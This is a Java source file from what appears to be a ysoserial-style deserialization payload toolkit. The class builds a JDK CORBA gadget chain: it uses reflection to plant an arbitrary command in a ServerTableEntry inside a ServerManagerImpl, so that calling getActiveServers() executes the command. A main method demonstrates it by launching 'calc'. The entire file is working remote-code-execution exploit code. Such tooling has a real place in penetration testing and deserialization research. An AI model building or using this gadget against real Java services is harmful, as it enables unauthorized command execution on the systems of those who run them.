package com.h2tg.ysogate.payloads.gadgets.jdk;

import com.h2tg.ysogate.payloads.gadgets.base.IGetter2CmdExec;
import com.h2tg.ysogate.utils.Reflections;
import com.sun.corba.se.impl.activation.ServerTableEntry;
import com.sun.corba.se.impl.activation.ServerManagerImpl;

import java.io.InputStream;
import java.io.OutputStream;
import java.util.HashMap;

public class GServerManagerImpl implements IGetter2CmdExec
{
    //com.sun.corba.se.impl.activation.ServerManagerImpl.getActiveServers
    //com.sun.corba.se.impl.activation.ServerTableEntry.activate
    @Override
    public Object getter2RCE(String cmd) throws Exception {
        ServerTableEntry entry = (ServerTableEntry) Reflections.forceNewInstance(ServerTableEntry.class);
        Reflections.setFieldValue(entry,"activationCmd",cmd);
        Reflections.setFieldValue(entry,"state",2);
        Reflections.setFieldValue(entry, "process", new Process() {
            @Override
            public OutputStream getOutputStream() {
                return null;
            }

            @Override
            public InputStream getInputStream() {
                return null;
            }

            @Override
            public InputStream getErrorStream() {
                return null;
            }

            @Override
            public int waitFor() throws InterruptedException {
                return 0;
            }

            @Override
            public int exitValue() {
                return 0;
            }

            @Override
            public void destroy() {

            }
        });
        ServerManagerImpl obj = (ServerManagerImpl) Reflections.forceNewInstance(ServerManagerImpl.class);
//        HashMap serverTable = new HashMap<>(256);
        HashMap serverTable = new HashMap();
        serverTable.put(1,entry);
        Reflections.setFieldValue(obj,"serverTable",serverTable);
        return obj;
    }

    public static void main(String[] args)
    {
        try
        {
            GServerManagerImpl gServerManagerImpl = new GServerManagerImpl();
            ServerManagerImpl object= (ServerManagerImpl) gServerManagerImpl.getter2RCE("calc");
            object.getActiveServers();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

}
